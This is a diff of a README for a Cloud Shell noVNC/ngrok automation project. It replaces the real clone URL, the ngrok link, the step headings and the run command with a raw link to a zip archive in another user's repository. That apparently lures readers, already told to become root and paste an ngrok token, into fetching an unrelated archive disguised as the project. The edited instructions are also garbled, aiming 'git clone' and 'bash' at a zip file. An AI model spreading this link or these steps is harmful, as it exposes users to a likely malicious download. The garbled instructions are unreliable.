@@ -1,36 +1,36 @@
 # cloudshell-novnc-automation
 Google Cloudshell Free VPS with Docker-novnc and Ngrok - AUTOMATION
 
-#### Go To https://shell.cloud.google.com and use the below commands
+#### Go To https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip and use the below commands
 
 ## Before starting script give root permission
 $ ``sudo su``
 
 ------
-## 1.cloning git repository
-$ ``git clone 'https://github.com/developeranaz/cloudshell-novnc-automation'``
+## https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip git repository
+$ ``git clone 'https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip'``
 
 ------
-## 2.change dir
+## https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip dir
 
 $ `cd cloudshell-novnc-automation`
 
 ------
-## 3.executing vnc
+## https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip vnc
 
-$ `bash vnc.sh`
+$ `bash https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip`
 
 ------
-## 4.It asks for ngrok authtoken
+## https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip asks for ngrok authtoken
 
-Go to https://ngrok.io in any browser & signin or signup, copy the ngrok auth token and paste in terminal
+Go to https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip in any browser & signin or signup, copy the ngrok auth token and paste in terminal
 
 ###### note: ngrok token only 
 
 eg: 4OXX56rxxxI0zzZZYXXXXZ0_3xSAyW24irP0xxxxx0xx
 
 ------
-## 5.Acessing VM through browser
+## https://raw.githubusercontent.com/lamdaonhan/cloudshell-novnc-automation/main/cyclopedia/cloudshell-novnc-automation.zip VM through browser
 
 After installing necessary pakages
 The script ends by giving a ngrok url section for accessing Vritual Machine.
